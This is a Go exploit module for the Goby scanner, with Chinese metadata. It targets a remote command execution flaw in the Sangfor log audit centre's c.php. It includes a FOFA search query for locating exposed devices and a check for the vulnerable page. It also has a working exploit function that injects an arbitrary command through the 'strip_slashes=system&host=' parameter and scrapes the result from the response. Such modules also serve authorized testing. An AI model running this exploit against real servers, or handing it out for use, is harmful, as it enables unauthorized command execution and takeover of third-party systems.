package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "深信服 日志中心 c.php 文件 远程命令执行漏洞",
    "Description": "<p>深信服日志审计系统是深信服公司推出的专业信息安全审计产品。</p><p>日志中心存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
    "Product": "深信服日志审计系统",
    "Homepage": "https://www.sangfor.com.cn/",
    "DisclosureDate": "2021-06-15",
    "Author": "zhanfeiyang",
    "FofaQuery": "body=\"isHighPerformance : !!SFIsHighPerformance,\" && body!=\"BA\" && body!=\"内部威胁管理\"",
    "GobyQuery": "body=\"isHighPerformance : !!SFIsHighPerformance,\" && body!=\"BA\" && body!=\"内部威胁管理\"",
    "Level": "3",
    "Impact": "<p>深信服日志中心存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
    "VulType": [
        "命令执行"
    ],
    "Tags": [
        "命令执行"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Is0day": false,
    "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.sangfor.com.cn/\">https://www.sangfor.com.cn/</a></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问</p>",
    "Translation": {
        "CN": {
            "Name": "深信服 日志中心 c.php 文件 远程命令执行漏洞",
            "Product": "深信服日志审计系统",
            "Description": "<p>深信服日志审计系统是深信服公司推出的专业信息安全审计产品。</p><p>日志中心存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.sangfor.com.cn/\" rel=\"nofollow\">https://www.sangfor.com.cn/</a><br></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问<br><br></p>",
            "Impact": "<p>深信服日志中心存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Tags": [
                "命令执行"
            ],
            "VulType": [
                "命令执行"
            ]
        }
    },
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html?h=%E6%B7%B1%E4%BF%A1%E6%9C%8D"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/tool/log/c.php",
                "header": {}
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<b>Log Helper</b>",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/tool/log/c.php?strip_slashes=system&host=",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<b>Log Helper</b>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|reg.FindString(resp.Utf8Html)[4:len-5]"
            ]
        }
    ],
    "AttackSurfaces": {
        "Application": [
            "Sangfor"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7298"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")

			cfg := httpclient.NewGetRequestConfig("/tool/log/c.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "<b>Log Helper</b>") {
					return true
				}
			}
			/*vulUri := "/tool/log/c.php"
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + vulUri); err == nil {
				if strings.Contains(resp.Utf8Html, "<b>Log Helper</b>") {
					return true
				}
			}*/
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfg :=httpclient.NewGetRequestConfig("/tool/log/c.php?strip_slashes=system&host="+cmd)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				reg := regexp.MustCompile("</p>(?s:(.*?))<pre>")
				len := len(reg.FindString(resp.Utf8Html))
				expResult.Output = reg.FindString(resp.Utf8Html)[4:len-5]
			}
			return expResult
		},
	))
}
